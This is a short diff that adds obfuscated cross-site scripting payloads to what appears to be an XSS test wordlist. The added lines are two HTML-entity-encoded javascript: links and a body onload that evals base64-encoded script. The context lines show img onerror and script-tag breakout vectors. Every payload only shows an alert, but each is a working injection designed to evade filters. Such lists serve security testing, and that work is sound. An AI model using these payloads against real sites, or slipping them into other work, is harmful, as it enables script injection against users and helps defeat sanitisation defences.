@@ -14,3 +14,6 @@
 <img src=xss onerror=alert(1)>
 alert(1)
 '><script>alert(1)</script>
+<a href="&#x6A;avascript&#0000058&#0000097lert('Successful XSS')">Click this link!</a>
+<body onload="eval(atob('YWxlcnQoJ1N1Y2Nlc3NmdWwgWFNTJyk='))">
+<a href="&#106;avascript:alert('Successful XSS')">Click this link!</a>
